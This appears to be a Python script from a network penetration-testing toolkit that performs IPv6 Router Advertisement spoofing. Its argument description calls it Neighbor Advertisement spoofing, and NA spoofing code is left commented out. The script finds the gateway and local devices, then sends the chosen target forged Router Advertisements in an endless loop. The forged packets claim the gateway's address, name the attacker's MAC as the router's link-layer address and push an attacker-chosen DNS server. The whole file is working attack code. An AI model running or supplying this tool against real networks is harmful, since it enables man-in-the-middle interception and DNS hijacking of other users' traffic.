#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath

project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from scanner import Scanner
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from network import ICMPv6_raw
from time import sleep
from icmpv6_scan import ICMPv6Scan

# endregion

# region Check user, platform and create threads
Base = Base()
Base.check_user()
Base.check_platform()
icmpv6 = ICMPv6_raw()
icmpv6_scan = ICMPv6Scan()
scanner = Scanner()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='NA (Neighbor Advertisement) spoofing')

parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets')

parser.add_argument('-t', '--target_ip', help='Set target IPv6 link local address', default=None)
parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)

parser.add_argument('-g', '--gateway_ip', help='Set gateway IPv6 link local address', default=None)
parser.add_argument('-p', '--ipv6_prefix', help='Set IPv6 prefix, default="fde4:8dba:82e1:ffff::/64"',
                    default="fde4:8dba:82e1:ffff::/64")

parser.add_argument('-d', '--dns_ip', help='Set DNS server IPv6 link local address', default=None)
parser.add_argument('-n', '--dns_domain_search', help='Set DNS domain search; default: "local"',
                    default="local")
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()
# endregion

# region Print banner if argument quit is not set
if not args.quiet:
    Base.print_banner()
# endregion

# region Get your network settings
if args.interface is None:
    Base.print_warning("Please set a network interface for sniffing ICMPv6 responses ...")
current_network_interface = Base.netiface_selection(args.interface)

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have MAC address!")
    exit(1)

your_ipv6_link_address = Base.get_netiface_ipv6_link_address(current_network_interface)
if your_ipv6_link_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have link local IPv6 address!")
    exit(1)
# endregion

# region Global variables
target_ipv6_address = None
target_mac_address = None
gateway_ipv6_address = None
gateway_mac_address = None
prefix = None
mtu = 1500
router_lifetime = 2
reachable_time = 2000
retrans_timer = 2000
advertisement_interval = 2000
dns_ipv6_address = None
# endregion

# region Create global raw socket
socket_global = socket(AF_PACKET, SOCK_RAW)
socket_global.bind((current_network_interface, 0))
# endregion

# region General output
if not args.quiet:
    Base.print_info("Network interface: ", current_network_interface)
    Base.print_info("Your IPv6 address: ", your_ipv6_link_address)
    Base.print_info("Your MAC address: ", your_mac_address)
# endregion

# region Main function
if __name__ == "__main__":

    # region Check arguments: gateway_ip and dns_ip

    # region Set variable for scan results
    router_advertisement_data = None
    # endregion

    # region Search Gateway and DNS servers
    if args.gateway_ip is None and args.dns_ip is None:

        Base.print_info("Search IPv6 Gateway and DNS server ....")
        router_advertisement_data = icmpv6_scan.search_router(current_network_interface, 5, 3)

        if router_advertisement_data is not None:
            gateway_ipv6_address = router_advertisement_data['router_ipv6_address']
            gateway_mac_address = router_advertisement_data['router_mac_address']

            if 'prefix' in router_advertisement_data.keys():
                prefix = router_advertisement_data['prefix']
            else:
                prefix = args.ipv6_prefix

            if 'mtu' in router_advertisement_data.keys():
                mtu = int(router_advertisement_data['mtu'])

            # if 'router_lifetime' in router_advertisement_data.keys():
            #     router_lifetime = int(router_advertisement_data['router_lifetime'])
            #
            # if 'reachable_time' in router_advertisement_data.keys():
            #     reachable_time = int(router_advertisement_data['reachable_time'])
            #
            # if 'retrans_timer' in router_advertisement_data.keys():
            #     retrans_timer = int(router_advertisement_data['retrans_timer'])

            if 'dns-server' in router_advertisement_data.keys():
                dns_ipv6_address = router_advertisement_data['dns-server']
            else:
                dns_ipv6_address = your_ipv6_link_address
        else:
            gateway_ipv6_address = your_ipv6_link_address
            gateway_mac_address = your_mac_address
            prefix = args.ipv6_prefix
            dns_ipv6_address = your_ipv6_link_address
    # endregion

    # region Check arguments: gateway_ip and dns_ip
    else:

        # region Check argument: gateway_ip
        if args.gateway_ip is not None:

            # Set Gateway MAC address and prefix
            gateway_mac_address = your_mac_address
            prefix = args.ipv6_prefix

            if Base.ipv6_address_validation(args.gateway_ip):
                if str(args.gateway_ip).startswith("fe80::"):
                    gateway_ipv6_address = args.gateway_ip
                else:
                    Base.print_error("Bad value `-g, --gateway_ip`: ", args.gateway_ip,
                                     "; Gateway link local ipv6 address must be starts with: ", "fe80::")
                    exit(1)
            else:
                Base.print_error("Bad value `-g, --gateway_ip`: ", args.gateway_ip,
                                 "; Failed to verify ipv6 address!")
                exit(1)
        # endregion

        # region Check argument: dns_ip
        if args.dns_ip is not None:
            if Base.ipv6_address_validation(args.dns_ip):
                dns_ipv6_address = args.dns_ip
            else:
                Base.print_error("Bad value `-d, --dns_ip`: ", args.dns_ip,
                                 "; Failed to verify ipv6 address!")
                exit(1)
        # endregion

    # endregion

    # region Print Gateway and DNS server information
    Base.print_success("Gateway IPv6 address: ", gateway_ipv6_address)
    Base.print_success("Gateway MAC address: ", gateway_mac_address)

    if router_advertisement_data is not None:
        Base.print_success("Gateway Vendor: ", router_advertisement_data['vendor'])

    Base.print_success("IPv6 prefix: ", prefix)

    if dns_ipv6_address is not None:
        Base.print_success("DNS IPv6 address: ", dns_ipv6_address)

    Base.print_success("MTU: ", str(mtu))
    Base.print_success("Router lifetime (s): ", str(router_lifetime))
    Base.print_success("Reachable time (ms): ", str(reachable_time))
    Base.print_success("Retrans timer (ms): ", str(retrans_timer))

    router_advertisement_data = None
    # endregion

    # endregion

    # region Check arguments: target_ip and target_mac

    # region Check argument: target_mac
    if args.target_mac is not None:
        if Base.mac_address_validation(args.target_mac):
            target_mac_address = str(args.target_mac).lower()
        else:
            Base.print_error("Bad value `-m, --target_mac`: ", args.target_mac,
                             "; Example MAC address: ", "12:34:56:78:90:AB")
            exit(1)
    # endregion

    # region Set variable for scan results
    target = None
    # endregion

    # region Search targets in local network
    if args.target_ip is None:
        Base.print_info("Search IPv6 devices ....")
        ipv6_devices = scanner.find_ipv6_devices(current_network_interface, 5, 3, gateway_ipv6_address)
        target = scanner.ipv6_device_selection(ipv6_devices)
        target_ipv6_address = target[0]
        target_mac_address = target[1]
    # endregion

    # region Check argument: target_ip
    else:
        if args.target_mac is None:
            Base.print_error("Please set target MAC address `-m, --target_mac`")
            exit(1)
        if Base.ipv6_address_validation(args.target_ip):
            if str(args.target_ip).startswith("fe80::"):
                if args.target_ip != your_ipv6_link_address:
                    if args.target_ip != gateway_ipv6_address:
                        target_ipv6_address = args.target_ip
                    else:
                        Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                                         "; Target IPv6 address is gateway link local IPv6 address!")
                        exit(1)
                else:
                    Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                                     "; Target IPv6 address is your link local IPv6 address!")
                    exit(1)
            else:
                Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                                 "; Target link local ipv6 address must be starts with: ", "fe80::")
                exit(1)
        else:
            Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                             "; Failed to verify ipv6 address!")
            exit(1)
    # endregion

    # region Print Target information
    Base.print_info("Target IPv6 address: ", target_ipv6_address)

    if target_mac_address is not None:
        Base.print_info("Target MAC address: ", target_mac_address)

    if target is not None:
        Base.print_info("Target Vendor: ", target[2])

    target = None
    # endregion

    # endregion

    # region Start spoofing
    try:
        Base.print_info("Send Router Advertisement packets to: ", target_ipv6_address +
                        " (" + target_mac_address + ")")
        Base.print_info("Start Router Advertisement spoofing ...")

        ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                            ethernet_dst_mac=target_mac_address,
                                                            ipv6_src=gateway_ipv6_address,
                                                            ipv6_dst=target_ipv6_address,
                                                            dns_address=dns_ipv6_address,
                                                            domain_search=args.dns_domain_search,
                                                            prefix=prefix,
                                                            mtu=mtu,
                                                            src_link_layer_address=your_mac_address,
                                                            router_lifetime=router_lifetime,
                                                            reachable_time=reachable_time,
                                                            retrans_timer=retrans_timer,
                                                            advertisement_interval=advertisement_interval)

        # na_packet_gateway = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
        #                                                               ethernet_dst_mac=target_mac_address,
        #                                                               ipv6_src=gateway_ipv6_address,
        #                                                               ipv6_dst=target_ipv6_address,
        #                                                               target_ipv6_address=gateway_ipv6_address)
        #
        # na_packet_dns = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
        #                                                           ethernet_dst_mac=target_mac_address,
        #                                                           ipv6_src=dns_ipv6_address,
        #                                                           ipv6_dst=target_ipv6_address,
        #                                                           target_ipv6_address=dns_ipv6_address)

        while True:
            socket_global.send(ra_packet)
            sleep(1)
            # socket_global.send(na_packet_gateway)
            # socket_global.send(na_packet_dns)
            # sleep(1)

    except KeyboardInterrupt:
        socket_global.close()
        Base.print_info("Exit")
        exit(0)
    # endregion

# endregion
